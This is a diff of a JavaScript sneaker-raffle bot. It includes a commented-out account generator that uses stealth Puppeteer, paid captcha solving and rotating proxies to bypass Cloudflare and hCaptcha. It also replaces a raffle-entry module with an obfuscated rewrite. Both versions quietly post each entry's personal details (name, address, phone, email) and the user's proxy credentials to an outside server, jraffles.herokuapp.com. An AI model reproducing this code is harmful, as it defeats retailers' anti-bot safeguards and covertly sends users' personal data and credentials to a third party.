-    //                         console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Raffle Entered!`));
-    //                         retry = '';
-    //                         var succesDEV = await makeEmbed(csv[i], currentFunction, 'dev', false);
-    //                         var succesPUB = await makeEmbed(csv[i], currentFunction, 'pub', false);
-
-    //                         const EMBEDS =
-    //                         {
-    //                             succesDEVMSG: { embeds: [succesDEV] },
-    //                             succesPUBMSG: { embeds: [succesPUB] }
-    //                         };
-    //                         try {
-    //                             if (settings.webhook != undefined && settings.webhook != '') {
-    //                                 await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-    //                             }
-    //                             await delay(200);
-    //                             await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-    //                             await delay(200);
-    //                             await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
-    //                         } catch (e) {
-    //                             console.log(chalk.yellow(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Error sending webhook ${e}`));
-
-    //                         }
-
-
-
-    //                     } catch (e) {
-    //                         console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${e}`));
-    //                         ERROR = `${e}`
-    //                         var errorDEV = await makeEmbed(csv[i], currentFunction, 'dev', true, ERROR);
-    //                         var succesDEV = await makeEmbed(csv[i], currentFunction, 'dev', false);
-    //                         var succesPUB = await makeEmbed(csv[i], currentFunction, 'pub', false);
-
-    //                         const EMBEDS =
-    //                         {
-    //                             succesDEVMSG: { embeds: [succesDEV] },
-    //                             succesPUBMSG: { embeds: [succesPUB] }
-    //                         };
-    //                         EMBEDS.errorDEV = { embeds: [errorDEV] }
-    //                         if (settings.webhook != undefined && settings.webhook != '') {
-    //                             await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-    //                         }
-    //                         await sendWebhook(errorWH, EMBEDS.errorDEV);
-    //                         if (e != 'Error sending entry. Check if duplicate, or proxies.') {
-
-    //                             retry = 'yes';
-    //                         }
-    //                     } finally {
-    //                         browser.close();
-    //                         if (retry == 'yes' && t != 5 && ERROR != 'Size Not Found') {
-    //                             console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5) `));
-    //                             i = i - 1;
-    //                             t = t + 1;
-    //                             continue;
-    //                         }
-    //                         if (retry == 'yes' && t >= 5) {
-    //                             errorLog(csv[i], currentFunction)
-    //                             retry = 'no';
-    //                             t = 0;
-    //                         }
-    //                         console.log(`${getTime()} [${currentFunction.name}] Waiting for ${settings.delay} ms`);
-    //                         await delay(settings.delay);
-    //                     }
-    //                 }
-    //             }
-    //         }
-    //     ]
-    // },
-    // {
-    //     name: 'Overkill',
-    //     modules: [
-    //         {
-    //             name: 'Overkill Account Generator',
-    //             store: 'Overkill',
-    //             logo: 'https://thesneakersbible.fr/wp-content/uploads/2021/04/logo-one-block-down.png',
-    //             function: async function (currentFunction, csv, proxies) {
-    //                 puppeteer.use(StealthPlugin());
-    //                 puppeteer.use(RecaptchaPlugin({
-    //                     provider: {
-    //                         id: '2captcha',
-    //                         token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
-    //                     },
-    //                     visualFeedback: true
-    //                 }))
-    //                 for (var i = 0; i < csv.length; i++) {
-    //                     if (retry != 'yes') {
-    //                         var retry = '';
-    //                         var t = 0;
-
-    //                     }
-    //                     var ERROR;
-    //                     try {
-    //                         await jig(csv, i);
-
-    //                     } catch {
-    //                         retry = 'no';
-    //                         throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
-    //                     }
-    //                     setTitle(`${currentFunction.name} Task ${i + 1} / ${csv.length} || File: ${currentFile} Proxies: ${currentProxy}`);
-
-    //                     var succesDEV = await makeEmbed(csv[i], currentFunction, 'acc', false);
-
-
-    //                     const EMBEDS =
-    //                     {
-    //                         succesDEVMSG: { embeds: [succesDEV] }
-    //                     };
-    //                     const url = `https://www.overkillshop.com/de-en/register`
-    //                     var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-    //                     var proxySplit = proxies[randomProxy].split(":");
-    //                     var browser;
-    //                     // pxyPBtPONpqy1jTFkbDYoTsQryOMa_b81yDXOV2wPvI-1676636568-0-160
-    //                     try {
-    //                         browser = await puppeteer.launch({
-    //                             executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-    //                             headless: false,
-    //                             args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-    //                         });
-
-    //                     } catch {
-    //                         browser = await puppeteer.launch({
-    //                             executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-    //                             headless: false,
-    //                             args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-    //                         });
-    //                     }
-    //                     try {
-    //                         const page = await browser.newPage();
-    //                         await page.setViewport({
-    //                             width: 1280 + randomIntFromInterval(1, 50),
-    //                             height: 729 + randomIntFromInterval(1, 50)
-    //                         })
-    //                         const session = await page.target().createCDPSession();
-    //                         const { windowId } = await session.send('Browser.getWindowForTarget');
-    //                         await page.authenticate({
-    //                             username: `${proxySplit[2]}`,
-    //                             password: `${proxySplit[3]}`,
-    //                         });
-    //                         console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-    //                         await page.goto(`${url}`, { waitUntil: 'networkidle2' });
-    //                         console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Solving Cloudflare`);
-    //                         await delay(5000);
-    //                         var cf = await page.$('.hcaptcha-box');
-    //                         if (cf) {
-    //                             console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Handling Challenge`);
-    //                             await delay(10000);
-    //                             const challengeButton = await page.$('.hcaptcha-box');
-    //                             if (challengeButton) {
-    //                                 try {
-
-    //                                     await challengeButton.click();
-    //                                 } catch {
-    //                                     throw new Error('Empty Turnstile Challenge')
-    //                                 }
-    //                             }
-    //                             try {
-    //                                 await page.waitForSelector('input[name="firstname"]', { timeout: 40000 });
-
-    //                             } catch {
-    //                                 var challengeButton2 = await page.$('.hcaptcha-box');
-    //                                 if (challengeButton2) {
-
-    //                                     try {
-
-    //                                         await challengeButton2.click();
-    //                                     } catch {
-    //                                         throw new Error('Empty Turnstile Challenge')
-    //                                     }
-    //                                 }
-    //                             }
-    //                             // await frame.click('#challenge-stage > div > label > input');
-
-    //                         }
-
-    //                         // try {
-    //                         //     const turnstile = await page.$eval()
-    //                         // } catch {
-
-    //                         // }
-    //                         try {
-
-    //                             await page.waitForSelector('input[name="firstname"]', { timeout: 120000 });
-    //                             await session.send('Browser.setWindowBounds', { windowId, bounds: { windowState: 'minimized' } });
-    //                             await delay(4000);
-    //                         } catch {
-    //                             throw new Error('Blocked by cloudflare')
-    //                         }
-    //                         console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Checking Credentials`);
-    //                         await page.type('input[name="firstname"]', `${csv[i].FirstName}`);
-    //                         await delay(500);
-    //                         await page.type('input[name="lastname"]', `${csv[i].LastName}`);
-    //                         await delay(500);
-    //                         await page.type('input[name="email"]', `${csv[i].Email}`);
-    //                         await delay(500);
-    //                         await page.type('input[name="password"]', `${csv[i].Password}`);
-    //                         await delay(600);
-    //                         await page.$eval('input[name="psgdpr"]', btn => btn.click());
-    //                         await delay(500);
-    //                         console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Sending Request`);
-    //                         await page.$eval('#customer-form', form => form.submit());
-    //                         try {
-    //                             try {
-    //                                 await page.waitForSelector('.product-list.slider-csv', { timeout: 60000 });
-
-    //                             } catch {
-    //                                 throw new Error('Succes-response not found')
-    //                             }
-    //                             retry = 'no';
-
-    //                             console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Account ${csv[i].Email} Generated`));
-    //                             fs.appendFileSync('../accounts/csv.csv', `\n${csv[i].Email},${csv[i].Password}`);
-    //                             let task = csv[i]
-    //                             try {
-    //                                 prxdata = {
-    //                                     username: username.replace('#', ''),
-    //                                     module: currentFunction.name,
-    //                                     entrydata: JSON.stringify(task),
-    //                                     proxy: `${proxies[i]}`
-    //                                 }
-    //                                 var prx = JSON.stringify(prxdata);
-    //                                 let config = {
-    //                                     headers: {
-    //                                         'content-type': 'application/json',
-    //                                     }
-    //                                 }
-    //                                 await axios.post('https://jraffles.herokuapp.com/success', prx, config)
-    //                             } catch (e) {
-
-    //                             }
-    //                             try {
-    //                                 if (settings.webhook != undefined && settings.webhook != '') {
-    //                                     await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-    //                                 }
-    //                             } catch {
-    //                             }
-    //                             await sendWebhook(accountWH, EMBEDS.succesDEVMSG);
-
-    //                         } catch (e) {
-    //                             throw new Error(`Account generation failed`)
-    //                         }
-
-
-    //                     } catch (e) {
-    //                         console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${e}`));
-    //                         ERROR = `${e}`
-    //                         var errorDEV = await makeEmbed(csv[i], currentFunction, 'acc', true, ERROR);
-    //                         EMBEDS.errorDEV = { embeds: [errorDEV] }
-    //                         if (settings.webhook != undefined && settings.webhook != '') {
-    //                             await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-    //                         }
-    //                         await sendWebhook(errorWH, EMBEDS.errorDEV);
-    //                         retry = 'yes';
-    //                     } finally {
-    //                         browser.close();
-    //                         if (retry == 'yes' && t != 5 && ERROR != 'Size Not Found') {
-    //                             console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-    //                             i = i - 1;
-    //                             t = t + 1;
-    //                             continue;
-    //                         }
-    //                         if (retry == 'yes' && t >= 5) {
-    //                             errorLog(csv[i], currentFunction)
-    //                             retry = 'no';
-    //                             t = 0;
-    //                         }
-    //                         console.log(`${getTime()} [${currentFunction.name}] Waiting for ${settings.delay} ms`);
-    //                         await delay(settings.delay);
-    //                     }
-    //                 }
-    //             }
-    //         }
-    //     ]
-    // },
     {
-        name: 'OQIUM Store',
-        modules: [
+        'name': 'OQIUM\x20Store',
+        'modules': [
             {
-                name: "OQIUM Raffle Entries",
-                store: "OQIUM",
-                logo: "https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png",
-                url: 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
-                data: {
-                    data: {
-                        type: "subscription",
-                        attributes: {
-                            list_id: "RVHsXu",
-                            custom_source: "DH6927-017",
-                            email: "",
-                            properties: {
-                                $first_name: "",
-                                $last_name: "",
-                                $phone_number: "",
-                                Size: "",
-                                'Instagram Account': "",
-                                $address1: "",
-                                $zip: "",
-                                $city: "",
-                                $country: "",
-                                'Accepts Marketing': [
-                                    "NoByRaffle"
-                                ],
-                                $consent_method: "Klaviyo Form",
-                                $consent_form_id: "ScxJcu",
-                                $consent_form_version: 9175131,
-                                services: "{\"shopify\":{\"source\":\"form\"}}",
-                                $timezone_offset: 2
+                'name': 'OQIUM\x20Raffle\x20Entries',
+                'store': 'OQIUM',
+                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
+                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
+                'data': {
+                    'data': {
+                        'type': 'subscription',
+                        'attributes': {
+                            'list_id': 'U6yui3',
+                            'custom_source': 'DV1748-601',
+                            'email': '',
+                            'properties': {
+                                '$first_name': '',
+                                '$last_name': '',
+                                '$phone_number': '',
+                                'Size': '',
+                                'Instagram\x20Account': '',
+                                '$address1': '',
+                                '$zip': '',
+                                '$city': '',
+                                '$country': '',
+                                'Accepts\x20Marketing': ['NoByRaffle'],
+                                '$consent_method': 'Klaviyo\x20Form',
+                                '$consent_form_id': 'SFX8xn',
+                                '$consent_form_version': 0x8d41f5,
+                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
+                                '$timezone_offset': 0x2
                             }
                         }
                     }
                 },
-                headers: {
-                    'accept': "*/*",
-                    "accept-encoding": "gzip, deflate, br",
-                    "access-control-allow-headers": "*",
-                    "content-type": "application/json",
-                    "origin": "https://oqium.com",
-                    "referer": "https://oqium.com/",
-                    "revision": "2022-02-16",
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
-                    'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
-                    "sec-ch-ua-mobile": "?0",
-                    "sec-ch-ua-platform": "'Windows'",
-                    "sec-fetch-dest": "empty",
-                    "sec-fetch-mode": "cors",
-                    "sec-fetch-site": "cross-site",
+                'headers': {
+                    'accept': '*/*',
+                    'accept-encoding': 'gzip,\x20deflate,\x20br',
+                    'access-control-allow-headers': '*',
+                    'content-type': 'application/json',
+                    'origin': 'https://oqium.com',
+                    'referer': 'https://oqium.com/',
+                    'revision': '2022-02-16',
+                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
+                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '\x27Windows\x27',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'cross-site'
                 },
-                function: async function (currentFunction, oqium, proxies) {
-                    var opium = oqium;
-                    var tasks = 0;
-                    for (var i = 0; i < oqium.length; i++) {
-                        maxTasks = settings.threads;
-
-                        while (tasks >= maxTasks) {
-                            await delay(settings.delay);
+                'function': async function (_0x10010f, _0x464e68, _0x71d199) {
+                    var _0x4ca455 = _0x464e68, _0x49d35c = 0x0;
+                    for (var _0x121e1a = 0x0; _0x121e1a < _0x464e68['length']; _0x121e1a++) {
+                        maxTasks = _0x51d52a['threads'];
+                        while (_0x49d35c >= maxTasks) {
+                            await _0x116d4a(_0x51d52a['delay']);
                         }
-                        async function oqium(currentFunction, oqium, proxies, i) {
-
+                        async function _0x11e5ee(_0x37ec4e, _0x274499, _0x20a986, _0x50afab) {
                             try {
-                                await jig(oqium, i);
-
-                            } catch (e) {
-
-                                throw new Error(e)
+                                await _0x2c2316(_0x274499, _0x50afab);
+                            } catch (_0x5c09a2) {
+                                throw new Error(_0x5c09a2);
                             }
-                            async function oqiumFunction(i, mode, currentFunction, oqium, proxies) {
-                                tasks++;
-                                var ERROR;
-                                var data = {};
-                                var embed = [];
-                                var msg = {};
-                                var sizeArray = [
-                                    '40', '40.5', '41', '42', '42.5', '43', '44', '45', '45.5', '46', '47', '47.5', '48'
-                                ]
-                                var randomSize = Math.round(Math.random() * (sizeArray.length - 1));
-
-                                if (!oqium) {
-                                    oqium = {
-
-                                    };
-                                }
-                                if (mode != 'ver') {
-                                    setTitle(`${currentFunction.name} Task ${i + 1} / ${oqium.length} || File: ${currentFile} Proxies: ${currentProxy}`);
-
-                                    embed = [
-                                        {
-                                            "type": "rich",
-                                            "title": `Succesful OQIUM Entry`,
-                                            "description": "",
-                                            "color": 0xc0d6d6,
-                                            "fields": [
-                                                {
-                                                    "name": `User`,
-                                                    "value": `${username}`
-                                                },
-                                                {
-                                                    "name": `Size`,
-                                                    "value": `${oqium[i].Size}`
-                                                },
-                                                {
-                                                    "name": `Delay`,
-                                                    "value": `${settings.delay}`
-                                                },
-                                                {
-                                                    "name": `Version`,
-                                                    "value": `${version}`
-                                                }
-                                            ]
-                                        }
-                                    ]
-                                    msg = { embeds: embed };
-
-
-                                    data = currentFunction.data;
-
-
-                                    data.data.attributes.email = `${oqium[i].Email}`;
-
-                                    if (oqium[i].Size == 'RANDOM') {
-
+                            async function _0x21e209(_0x3dee62, _0x2d4035, _0x284215, _0x355a69, _0x57353b) {
+                                _0x49d35c++;
+                                var _0x5c539a, _0x468a1e = {}, _0x1335d9 = [], _0x1e4394 = {}, _0x2a3be3 = [
+                                    '40',
+                                    '40.5',
+                                    '41',
+                                    '42',
+                                    '42.5',
+                                    '43',
+                                    '44',
+                                    '45',
+                                    '45.5',
+                                    '46',
+                                    '47',
+                                    '47.5',
+                                    '48'
+                                ], _0x647662 = Math['round'](Math['random']() * (_0x2a3be3['length'] - 0x1));
+                                !_0x355a69 && (_0x355a69 = {});
+                                if (_0x2d4035 != 'ver') {
+                                    _0x244762(_0x284215['name'] + '\x20Task\x20' + (_0x3dee62 + 0x1) + '\x20/\x20' + _0x355a69['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7), _0x1335d9 = [{
+                                        'type': 'rich',
+                                        'title': 'Succesful\x20OQIUM\x20Entry',
+                                        'description': '',
+                                        'color': 0xc0d6d6,
+                                        'fields': [
+                                            {
+                                                'name': 'User',
+                                                'value': '' + _0x358285
+                                            },
+                                            {
+                                                'name': 'Size',
+                                                'value': '' + _0x355a69[_0x3dee62]['Size']
+                                            },
+                                            {
+                                                'name': 'Delay',
+                                                'value': '' + _0x51d52a['delay']
+                                            },
+                                            {
+                                                'name': 'Version',
+                                                'value': '' + _0x3b2d4c
+                                            }
+                                        ]
+                                    }], _0x1e4394 = { 'embeds': _0x1335d9 }, _0x468a1e = _0x284215['data'], _0x468a1e['data']['attributes']['email'] = '' + _0x355a69[_0x3dee62]['Email'];
+                                    if (_0x355a69[_0x3dee62]['Size'] == 'RANDOM') {
                                     }
-
-                                    data.data.attributes.properties.$first_name = `${oqium[i].FirstName}`;
-                                    data.data.attributes.properties.$last_name = `${oqium[i].LastName}`;
-                                    data.data.attributes.properties.$address1 = `${oqium[i].Address1} ${oqium[i].Address2} ${oqium[i].HouseNumber}`;
-                                    data.data.attributes.properties.$zip = `${oqium[i].Zip}`;
-                                    data.data.attributes.properties.$city = `${oqium[i].City}`;
-                                    data.data.attributes.properties.$country = `${oqium[i].Country}`;
-                                    if (
-                                        oqium[i].Size == 'RANDOM'
-                                    ) {
-                                        // oqium[i].Size = sizeArray[randomSize]
-                                        data.data.attributes.properties.Size = `US W / EU ${sizeArray[randomSize]}`;
-                                    }
-                                    else {
-
-                                        data.data.attributes.properties.Size = `US W / EU ${oqium[i].Size}`;
-                                    }
-                                    data.data.attributes.properties.$phone_number = `${oqium[i].Phone}`;
-                                    data.data.attributes.properties['Instagram Account'] = `${oqium[i].Follower}`;
+                                    _0x468a1e['data']['attributes']['properties']['$first_name'] = '' + _0x355a69[_0x3dee62]['FirstName'], _0x468a1e['data']['attributes']['properties']['$last_name'] = '' + _0x355a69[_0x3dee62]['LastName'], _0x468a1e['data']['attributes']['properties']['$address1'] = _0x355a69[_0x3dee62]['Address1'] + '\x20' + _0x355a69[_0x3dee62]['Address2'] + '\x20' + _0x355a69[_0x3dee62]['HouseNumber'], _0x468a1e['data']['attributes']['properties']['$zip'] = '' + _0x355a69[_0x3dee62]['Zip'], _0x468a1e['data']['attributes']['properties']['$city'] = '' + _0x355a69[_0x3dee62]['City'], _0x468a1e['data']['attributes']['properties']['$country'] = '' + _0x355a69[_0x3dee62]['Country'], _0x355a69[_0x3dee62]['Size'] == 'RANDOM' ? _0x468a1e['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x2a3be3[_0x647662] : _0x468a1e['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x355a69[_0x3dee62]['Size'], _0x468a1e['data']['attributes']['properties']['$phone_number'] = '' + _0x355a69[_0x3dee62]['Phone'], _0x468a1e['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x355a69[_0x3dee62]['Follower'];
                                 }
-
-                                if (settings.useRandomProxy = false) {
-                                    var proxySplit = proxies[i].split(":");
-                                } else {
-                                    var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                                    var proxySplit = proxies[randomProxy].split(":");
-                                }
-
-
-
-                                var options = {
-                                    jar: j,
-                                    followAllRedirects: true,
-                                    method: 'POST',
-                                    url: currentFunction.url,
-                                    headers: currentFunction.headers,
-                                    body: JSON.stringify(data),
-                                    proxy: `http://${proxySplit[2]}:${proxySplit[3]}@${proxySplit[0]}:${proxySplit[1]}`,
+                                if (_0x51d52a['useRandomProxy'] = ![])
+                                    var _0x18196f = _0x57353b[_0x3dee62]['split'](':');
+                                else
+                                    var _0x385773 = Math['round'](Math['random']() * (_0x57353b['length'] - 0x1)), _0x18196f = _0x57353b[_0x385773]['split'](':');
+                                var _0x34143b = {
+                                    'jar': _0x103baf,
+                                    'followAllRedirects': !![],
+                                    'method': 'POST',
+                                    'url': _0x284215['url'],
+                                    'headers': _0x284215['headers'],
+                                    'body': JSON['stringify'](_0x468a1e),
+                                    'proxy': 'http://' + _0x18196f[0x2] + ':' + _0x18196f[0x3] + '@' + _0x18196f[0x0] + ':' + _0x18196f[0x1]
                                 };
-                                if (mode != 'ver') {
-                                    options.url = currentFunction.url
-                                    options.headers = currentFunction.headers
-                                }
-                                if (mode == 'ver') {
-                                    options.method = 'GET';
-                                }
-                                return new Promise(function (resolve, reject) {
-                                    callback = async (err, res, body) => {
-                                        if (!err && res.statusCode == 202 || !err && res.statusCode == 200) {
-                                            if (mode != 'ver') {
-                                                // console.log(`StatusCode: ${res.statusCode}`)
-                                                var succesDEV = await makeEmbed(oqium[i], currentFunction, 'dev', false);
-                                                var succesPUB = await makeEmbed(oqium[i], currentFunction, 'pub', false);
-                                                const EMBEDS =
-                                                {
-                                                    succesDEVMSG: { embeds: [succesDEV] },
-                                                    succesPUBMSG: { embeds: [succesPUB] }
+                                return _0x2d4035 != 'ver' && (_0x34143b['url'] = _0x284215['url'], _0x34143b['headers'] = _0x284215['headers']), _0x2d4035 == 'ver' && (_0x34143b['method'] = 'GET'), new Promise(function (_0x6c71d0, _0x21317c) {
+                                    callback = async (_0x446288, _0x20c425, _0x16cce6) => {
+                                        if (!_0x446288 && _0x20c425['statusCode'] == 0xca || !_0x446288 && _0x20c425['statusCode'] == 0xc8) {
+                                            if (_0x2d4035 != 'ver') {
+                                                var _0x2fac89 = await _0x2520f4(_0x355a69[_0x3dee62], _0x284215, 'dev', ![]), _0x3a2d65 = await _0x2520f4(_0x355a69[_0x3dee62], _0x284215, 'pub', ![]);
+                                                const _0x437d14 = {
+                                                    'succesDEVMSG': { 'embeds': [_0x2fac89] },
+                                                    'succesPUBMSG': { 'embeds': [_0x3a2d65] }
                                                 };
-                                                let task = oqium[i]
+                                                let _0x1b67d0 = _0x355a69[_0x3dee62];
                                                 try {
                                                     prxdata = {
-                                                        username: username.replace('#', ''),
-                                                        module: currentFunction.name,
-                                                        entrydata: JSON.stringify(task),
-                                                        proxy: `${proxies[i]}`
-                                                    }
-                                                    var prx = JSON.stringify(prxdata);
-                                                    let config = {
-                                                        headers: {
-                                                            'content-type': 'application/json',
-                                                        }
-                                                    }
-                                                    await axios.post('https://jraffles.herokuapp.com/success', prx, config)
-
-                                                } catch (e) {
-
+                                                        'username': _0x358285['replace']('#', ''),
+                                                        'module': _0x284215['name'],
+                                                        'entrydata': JSON['stringify'](_0x1b67d0),
+                                                        'proxy': '' + _0x57353b[_0x3dee62]
+                                                    };
+                                                    var _0x154315 = JSON['stringify'](prxdata);
+                                                    let _0x2cc185 = { 'headers': { 'content-type': 'application/json' } };
+                                                    await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x154315, _0x2cc185);
+                                                } catch (_0x12266c) {
                                                 }
-                                                if (settings.webhook != undefined && settings.webhook != '') {
+                                                if (_0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '')
                                                     try {
-
-                                                        await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
+                                                        await _0x3c7bbe(_0x51d52a['webhook'], _0x437d14['succesDEVMSG']);
                                                     } catch {
-
                                                     }
-                                                }
-                                                await delay(200);
-                                                await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-                                                await delay(200);
+                                                await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x437d14['succesDEVMSG']), await _0x116d4a(0xc8);
                                                 try {
-
-                                                    await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
+                                                    await _0x3c7bbe(_0x55a106, _0x437d14['succesPUBMSG']);
                                                 } catch {
-
                                                 }
-                                                successfulLog(oqium[i], currentFunction);
+                                                _0x523ce4(_0x355a69[_0x3dee62], _0x284215);
                                             }
-                                            tasks--;
-                                            resolve(console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1}: Raffle Entered!`)));
+                                            _0x49d35c--, _0x6c71d0(console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x284215['name'] + ']\x20Task\x20' + (_0x3dee62 + 0x1) + ':\x20Raffle\x20Entered!')));
                                         } else {
-                                            if (mode != 'ver') {
-                                                var ERROR = `${err}`;
-                                                var errorDEV = await makeEmbed(oqium[i], currentFunction, 'dev', true, ERROR);
-                                                var EMBEDS = {}
-                                                EMBEDS.errorDEV = { embeds: [errorDEV] }
-                                                errorLog(oqium[i], currentFunction)
-
-                                                if (settings.webhook != undefined && settings.webhook != '') {
-                                                    await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                                                }
-                                                await sendWebhook(errorWH, EMBEDS.errorDEV);
-
+                                            if (_0x2d4035 != 'ver') {
+                                                var _0x4f4b37 = '' + _0x446288, _0x56a9b5 = await _0x2520f4(_0x355a69[_0x3dee62], _0x284215, 'dev', !![], _0x4f4b37), _0x147353 = {};
+                                                _0x147353['errorDEV'] = { 'embeds': [_0x56a9b5] }, _0x5925c7(_0x355a69[_0x3dee62], _0x284215), _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x147353['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x147353['errorDEV']);
                                             }
-                                            tasks--;
-                                            reject(console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1}: ${err}`)));
+                                            _0x49d35c--, _0x21317c(console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x284215['name'] + ']\x20Task\x20' + (_0x3dee62 + 0x1) + ':\x20' + _0x446288)));
                                         }
-                                    }
+                                    };
                                     try {
-                                        if (mode != 'ver') {
-                                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1}: Sending Entry for ${data.data.attributes.email}`)
-                                        }
-                                        request(options, callback);
-                                    } catch (err) {
-                                        console.log(`${getTime()} Task ${i + 1}: ${err}`);
+                                        _0x2d4035 != 'ver' && console['log'](_0x3982db() + '\x20[' + _0x284215['name'] + ']\x20Task\x20' + (_0x3dee62 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x468a1e['data']['attributes']['email']), _0x225fcc(_0x34143b, callback);
+                                    } catch (_0x105d26) {
+                                        console['log'](_0x3982db() + '\x20Task\x20' + (_0x3dee62 + 0x1) + ':\x20' + _0x105d26);
                                     }
                                 });
-                            };
-                            try {
-                                await oqiumFunction(i, 'nor', currentFunction, oqium, proxies);
-                                console.log(`${getTime()} [${currentFunction.name}] Sleeping for ${settings.delay} ms`);
-                                await delay(settings.delay);
-
-                            } catch (e) {
-
                             }
-
+                            ;
+                            try {
+                                await _0x21e209(_0x50afab, 'nor', _0x37ec4e, _0x274499, _0x20a986), console['log'](_0x3982db() + '\x20[' + _0x37ec4e['name'] + ']\x20Sleeping\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
+                            } catch (_0x5ea170) {
+                            }
                         }
-                        oqium(currentFunction, opium, proxies, i);
-                        await delay(1000);
+                        _0x11e5ee(_0x10010f, _0x4ca455, _0x71d199, _0x121e1a), await _0x116d4a(0x3e8);
                     }
                 }
-                // function: async function (currentFunction, csv, proxies) {
-                //     puppeteer.use(StealthPlugin());
-                //     puppeteer.use(RecaptchaPlugin({
-                //         provider: {
-                //             id: '2captcha',
-                //             token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
-                //         },
-                //         visualFeedback: true
-                //     }))
-                //     for (var i = 0; i < csv.length; i++) {
-                //         var ERROR;
-                //         if (retry != 'yes') {
-                //             var retry = '';
-                //             var t = 0;
-
-                //         }
-                //         setTitle(`${currentFunction.name} Task ${i + 1} / ${csv.length} || File: ${currentFile} Proxies: ${currentProxy}`);
-                //         try {
-                //             await jig(csv, i);
-
-                //         } catch {
-                //             retry = 'no';
-                //             throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
-                //         }
-                //         if (csv[i].Email == '' || csv[i].Password == '' || csv[i].FirstName == '' || csv[i].LastName == '') {
-                //             console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Invalid CSV`);
-                //             continue;
-                //         }
-
-                //         if (settings.useRandomProxy = false) {
-                //             var proxySplit = proxies[i].split(":");
-                //         } else {
-                //             var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                //             var proxySplit = proxies[randomProxy].split(":");
-                //         }
-                //         var browser
-                //         try {
-                //             browser = await puppeteer.launch({
-                //                 executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                //                 headless: true,
-                //                 args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                //             });
-
-                //         } catch {
-                //             browser = await puppeteer.launch({
-                //                 executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                //                 headless: true,
-                //                 args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                //             });
